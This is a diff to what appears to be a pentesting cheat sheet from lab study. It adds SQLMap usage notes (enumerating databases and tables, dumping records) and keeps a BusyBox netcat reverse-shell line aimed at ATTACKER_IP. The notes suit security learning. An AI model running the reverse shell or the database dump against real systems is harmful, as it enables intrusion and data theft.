@@ -1754,3 +1754,23 @@ E.g. BusyBox
 ```
 busybox nc ATTACKER_IP 443 -e sh
 ```
+
+## SQLMap
+<i>SQLMap</i> is an automated tool for detecting and exploiting SQLi vulnerabilities in web apps. 
+
+Basic syntax: **sqlmap -u [GET_URL] [flags]**
+
+Note: GET URLs can be taken from Developer Tools -> Network after sending a sample POST request.
+
+Some key information flags to take note of:
++ **--help** - lists all available flags
++ **--wizard** - step-by-step guide to complete a particular scan; useful for beginners
+
+Main SQLi flags include:
++ **--dbs** - extract all database names
++ **-D [database_name]** - select a specific database
++ **--tables** - extract all tables from a database
++ **-T [table_name]** - select a specific table
++ **--dump** - extract all records
+
+E.g. sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
